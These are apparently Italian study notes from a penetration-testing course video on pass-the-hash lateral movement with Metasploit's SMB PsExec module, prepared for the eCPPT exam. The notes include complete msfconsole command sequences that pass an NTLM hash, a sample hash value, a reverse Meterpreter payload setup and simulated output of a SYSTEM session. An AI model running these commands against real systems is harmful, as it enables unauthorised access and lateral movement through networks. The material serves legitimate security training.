# 09 — Pass-the-Hash with Metasploit (Lateral Movement & Pivoting)

> **Modulo:** Lateral Movement & Pivoting · **Video:** 9/16
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [09_Pass-the-Hash with Metasploit.txt](09_Pass-the-Hash with Metasploit.txt) · [09_Pass-the-Hash with Metasploit.srt](09_Pass-the-Hash with Metasploit.srt)

## Concetti chiave

- **Pass-the-Hash (PtH)** = autenticazione SMB usando l'**NTLM hash** al posto della password in chiaro.
- Metasploit ha la sua implementazione di PsExec come modulo: **`exploit/windows/smb/psexec`** → accetta sia password sia hash.
- Vantaggio rispetto a `psexec.py` (Impacket): si ottiene **direttamente una sessione Meterpreter** (no upgrade necessario via `web_delivery`).
- L'hash NTLM va passato nel formato **`LM:NT`** → se hai solo l'NT, anteponi **32 zeri** come LM:  
  `00000000000000000000000000000000:<NT_HASH>`.
- Tecnica valida quando si è già fatto **credential dumping** (Mimikatz, hashdump, ecc.) e si vuole muoversi lateralmente.
- Funziona perché NTLM è **challenge-response**: il server non chiede la password, ma la risposta calcolata dall'hash → l'hash basta.

## Spiegazione approfondita

### Perché PtH con Metasploit
Hai già visto PtH con:
- `crackmapexec -H <hash>`
- `psexec.py -hashes <LM>:<NT>` (Impacket)
- `smbexec.py` / `wmiexec.py`

Il modulo Metasploit `smb/psexec` aggiunge un valore extra: l'esecuzione del payload finale produce una **Meterpreter session**, che porta con sé tutto il post-exploitation framework (token impersonation, hashdump, kiwi, route, portfwd…). Nessun bisogno di rilanciare un secondo handler.

### Come funziona il modulo (workflow interno)
1. Si connette a **SMB porta 445** del target.
2. Autenticazione NTLM con username + (password o NT hash).
3. Upload di un service binary su **ADMIN$**.
4. Creazione di un servizio Windows temporaneo che esegue il payload.
5. Payload si connette al multi-handler → **Meterpreter as NT AUTHORITY\SYSTEM**.
6. Cleanup del servizio.

→ Identico al PsExec originale, ma payload integrato in MSF.

### Formato hash NTLM richiesto
- I lab eCPPT/INE forniscono di solito **solo l'NT hash** (32 hex char).
- Il campo `SMBPass` accetta una stringa `LM:NT`. Soluzione: 32 zeri come LM placeholder.
- Esempio:  
  `aad3b435b51404eeaad3b435b51404ee:<NT>` ← LM "vuoto" reale (DES di stringa nulla).  
  `00000000000000000000000000000000:<NT>` ← Funziona ugualmente in MSF.

### Scelta del payload
- Default: `windows/meterpreter/reverse_tcp` (32-bit).
- Su target moderni (Windows Server 2012+, x64) può essere necessario forzare:  
  `set payload windows/x64/meterpreter/reverse_tcp`.
- Se il primo tentativo fallisce / non spawna shell → cambia architettura.

## Comandi & strumenti

```bash
# Avvio MSF
msfconsole -q

# Cerca e seleziona il modulo
search psexec
use exploit/windows/smb/psexec        # modulo n. 4 nella search list

# Configurazione minima
set RHOSTS <TARGET_IP>
set SMBUser administrator
set SMBPass 00000000000000000000000000000000:<NT_HASH>

# (Opzionale) Cambia payload se target x64
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <KALI_IP>

# Esegui
exploit
# oppure: run
```

Tool/moduli citati:
- `exploit/windows/smb/psexec` (Metasploit)
- Alternative: `crackmapexec`, `impacket-psexec`, `impacket-smbexec`, `impacket-wmiexec`
- Per dumpare hash: `mimikatz`, `hashcat` (cracking), Meterpreter `hashdump`

## Esempi pratici

```bash
# Scenario lab: hai NT hash dell'Administrator, IP target noto
msfconsole -q
msf6 > search psexec
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.0.0.50
msf6 exploit(windows/smb/psexec) > set SMBUser administrator
msf6 exploit(windows/smb/psexec) > set SMBPass 00000000000000000000000000000000:32ed87bdb5fdc5e9cba88547376818d4
msf6 exploit(windows/smb/psexec) > show options
msf6 exploit(windows/smb/psexec) > exploit

# [*] Connecting to the server...
# [*] Authenticating to 10.0.0.50:445 as user 'administrator'...
# [*] Selecting PowerShell target
# [*] Executing the payload...
# [*] Sending stage (200774 bytes) to 10.0.0.50
# [*] Meterpreter session 1 opened

meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM
meterpreter > getprivs
meterpreter > sysinfo
```

Se il primo payload non aggancia:
```bash
msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > exploit
```

## Punti d'attenzione per l'esame eCPPT

- **Nome esatto del modulo**: `exploit/windows/smb/psexec`. È IL modulo principale di PtH in MSF.
- **Formato hash MSF**: `LM:NT`. Solo NT? → 32 zeri davanti + `:`. Domanda classica.
- **Username target**: deve essere in **local Administrators** (stesso prerequisito di PsExec).
- **Risultato**: Meterpreter come **NT AUTHORITY\SYSTEM** → privilegio max → no priv esc.
- **SMB porta 445** (non 139).
- **Vantaggio vs `psexec.py`**: Meterpreter integrato → puoi subito fare `hashdump`, `route add`, `portfwd`, `kiwi`.
- **Quando preferire MSF**: pivot point per i prossimi step (autoroute, socks proxy → video 012-013).
- **Quando preferire Impacket**: ambiente già impostato con `proxychains` + script Python; più portabile.
- **Stesso meccanismo**: usa l'NTLM challenge-response. **Niente di cifrato in chiaro**, ma hash = password equivalent per NTLM.

## Collegamenti con altri video

- Teoria PtH: [[03_Windows Lateral Movement Techniques]]
- PtH con tool Impacket: [[04_Lateral Movement with PsExec]] · [[05_Lateral Movement with SMBExec]] · [[010_Pass-the-Hash with WMIExec]]
- PtH con CME: [[06_Lateral Movement with CrackMapExec]]
- Concetto NTLM/Kerberos in AD: [[../Active Directory Penetration Testing/012_AD Lateral Movement_ Pass-the-Hash]]
- Setup pivoting da Meterpreter: [[012_Pivoting & Port Forwarding with Metasploit]]
